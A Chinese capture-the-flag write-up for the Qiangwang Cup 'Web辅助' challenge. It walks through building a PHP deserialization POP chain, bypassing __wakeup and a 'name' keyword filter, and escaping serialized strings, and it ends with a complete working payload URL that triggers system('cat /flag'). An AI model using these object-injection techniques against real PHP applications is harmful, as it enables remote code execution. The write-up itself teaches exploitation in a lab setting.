本文首发于“合天智汇”公众号 作者：Ch3ng

这里就借由强网杯的一道题目“Web辅助”，来讲讲从构造POP链，字符串逃逸到最后获取flag的过程

# 题目源码

# index.php

获取我们传入的username和password，并将其序列化储存

    
    
    ...
    if (isset($_GET['username']) && isset($_GET['password'])){
        $username = $_GET['username'];
        $password = $_GET['password'];
        $player = new player($username, $password);
        file_put_contents("caches/".md5($_SERVER['REMOTE_ADDR']), write(serialize($player))); 
        echo sprintf('Welcome %s, your ip is %s\n', $username, $_SERVER['REMOTE_ADDR']);
    }
    else{
        echo "Please input the username or password!\n";
    }
    ...

# common.php

这里面的read，write有与'\0\0',
chr(0)."".chr(0)相关的替换操作，还有一个check对我们的序列化的内容进行检查，判断是否存在关键字name，这里也是我们需要绕过的一个地方

    
    
    <?php
    function read($data){
        $data = str_replace('\0*\0', chr(0)."*".chr(0), $data);
        var_dump($data);
        return $data;
    }
    function write($data){
        $data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);
    
        return $data;
    }
    
    function check($data)
    {
        if(stristr($data, 'name')!==False){
            die("Name Pass\n");
        }
        else{
            return $data;
        }
    }
    ?>

# play.php

在写入序列化的内容之后，访问play.php，如果我们的操作通过了check，然后经过了read的替换操作之后，便会进行反序列化操作

    
    
    ...
    @$player = unserialize(read(check(file_get_contents("caches/".md5($_SERVER['REMOTE_ADDR'])))));
    ...

# class.php

这里存在着各种类，也是我们构造pop链的关键，我们的目的是为了触发最后的cat /flag

    
    
    <?php
    class player{
        protected $user;
        protected $pass;
        protected $admin;
    
        public function __construct($user, $pass, $admin = 0){
            $this->user = $user;
            $this->pass = $pass;
            $this->admin = $admin;
        }
    
        public function get_admin(){
            $this->admin = 1;
            return $this->admin ;
        }
    }
    
    class topsolo{
        protected $name;
    
        public function __construct($name = 'Riven'){
            $this->name = $name;
        }
    
        public function TP(){
            if (gettype($this->name) === "function" or gettype($this->name) === "object"){
                $name = $this->name;
                $name();
            }
        }
    
        public function __destruct(){
            $this->TP();
        }
    
    }
    
    class midsolo{
        protected $name;
    
        public function __construct($name){
            $this->name = $name;
        }
    
        public function __wakeup(){
            if ($this->name !== 'Yasuo'){
                $this->name = 'Yasuo';
                echo "No Yasuo! No Soul!\n";
            }
        }
    
    
        public function __invoke(){
            $this->Gank();
        }
    
        public function Gank(){
            if (stristr($this->name, 'Yasuo')){
                echo "Are you orphan?\n";
            }
            else{
                echo "Must Be Yasuo!\n";
            }
        }
    }
    
    class jungle{
        protected $name = "";
    
        public function __construct($name = "Lee Sin"){
            $this->name = $name;
        }
    
        public function KS(){
            system("cat /flag");
        }
    
        public function __toString(){
            $this->KS();  
            return "";  
        }
    
    }
    ?>

# 涉及考点

  * POP链的构造
  * __wakeup的绕过
  * 关键字“name”检测绕过
  * 反序列化字符串逃逸

# 题目出现的魔术方法

  * __construct：构造函数，具有构造函数的类会在每次创建新对象时先调用此方法
  * __destruct: 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行
  *  **wakeup：unserialize()会检查是否存在一个** wakeup() 方法。如果存在，则会先调用
  *  **invoke：当尝试以调用函数的方式调用一个对象时，** invoke() 方法会被自动调用
  * __toString()：用于一个类被当成字符串时应怎样回应

# POP链

POP链：如果我们需要触发的关键代码在一个类的普通方法中，例如本题的system('cat
/flag')在jungle类中的KS方法中，这个时候我们可以通过相同的函数名将类的属性和敏感函数的属性联系起来

# POP链的构造

这里涉及到三个类，topsolo、midsolo、jungle，其中观察到topsolo类中的TP方法中，使用了$name()，如果我们将一个对象赋值给$name，这里便是以调用函数的方式调用了一个对象，此时会触发
**invoke方法，而invoke方法存在** **与** **midsolo中，** invoke()会触发Gank方法，执行了stristr操作。

我们的最终目的是要触发jungle类中的KS方法，从而cat
/flag，而触发KS方法得先触发__toString方法，一般来说，在我们使用echo输出对象时便会触发，例如：

    
    
    <?php
    class test{
        function __toString(){
            echo "__toString()";
            return "";
        }
    }
    $a = new test();
    echo $a;
    
    //输出：__toString()

在common.php中，我们并没有看到有echo一个类的操作，但是有一个stristr($this->name, 'Yasuo')的操作，我们来看一下：

    
    
    <?php
    class test{
        function __toString(){
            echo "__toString()";
            return "";
        }
    }
    $a = new test();
    stristr($a,'name');
    
    //输出__toString()

所以整个POP链已经构成了

    
    
    topsolo->__destruct()->TP()->$name()->midsolo->__invoke()->Gank()->stristr()->jungle->__toString()->KS()->syttem('cat /flag')

即：

    
    
    <?php
    
    class topsolo{
        protected $name;
    
        public function __construct($name = 'Riven'){
            $this->name = $name;
        }
    }
    
    class midsolo{
        protected $name;
    
        public function __construct($name){
            $this->name = $name;
        }
    }
    
    class jungle{
        protected $name = "";
    
    }
    $a = new topsolo(new midsolo(new jungle()));
    $exp = serialize($a);
    var_dump(urlencode($exp));
    ?>
    
    输出：
    O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D

在midsolo中 **wakeup需要绕过，老套路了，序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过**
wakeup的执行，这里我将1改为2

    
    
    O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D
    
    O:7:"topsolo":1:{s:7:"\000*\000name";O:7:"midsolo":2:{s:7:"\000*\000name";O:6:"jungle":1:{s:7:"\000*\000name";s:0:"";}}}

# 关键字“name”检测绕过

    
    
    ···
    function check($data)
    {
        if(stristr($data, 'name')!==False){
            die("Name Pass\n");
        }
        else{
            return $data;
        }
    }
    ···

这里使用十六进制绕过\6e\61\6d\65，并将s改为S

    
    
    O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D

# 字符串逃逸

访问index.php，传入数值，得到序列化内容

    
    
    O:6:"player":3:{s:7:"\0*\0user";s:0:"";s:7:"\0*\0pass";s:126:"O:7:"topsolo":1:{S:7:"\0*\0\6e\61\6d\65";O:7:"midsolo":2:{S:7:"\0*\0\6e\61\6d\65";O:6:"jungle":1:{S:7:"\0*\0\6e\61\6d\65";s:0:"";}}}";s:8:"\0*\0admin";i:0;}

可以看到对象topsolo，midsolo被s:102，所包裹，我们要做的就是题目环境本身的替换字符操作从而达到对象topsolo，midsolo从引号的包裹中逃逸出来

    
    
    ···
    function read($data){
        $data = str_replace('\0*\0', chr(0)."*".chr(0), $data);
        var_dump($data);
        return $data;
    }
    function write($data){
        $data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);
    
        return $data;
    }
    ···

在反序列化操作前，有个read的替换操作，字符数量从5位变成3位，合理构造username的长度，经过了read的替换操作后，最后将";s:7:"\0\0pass";s:126吃掉，需要吃掉的长度为23，因为5->3，所以得为2的倍数，需要在password中再填充一个字符C，变成24位，所以我们一共需要构造12个\0\0来进行username填充，得到username

    
    
    username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0

在password中补上被吃掉的pass部分，构造password的提交内容

    
    
    password=C";s:7:"\0*\0pass";O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D

最后提交

    
    
    ?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=C";s:7:"\0*\0pass";O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D

然后访问play.php即可得到flag

 **实验推荐**

 **PHP反序列化漏洞实验**

<https://sourl.cn/d4dQZL>

通过本次实验，大家将会明白什么是反序列化漏洞，反序列化漏洞的成因以及如何挖掘和预防此类漏洞。

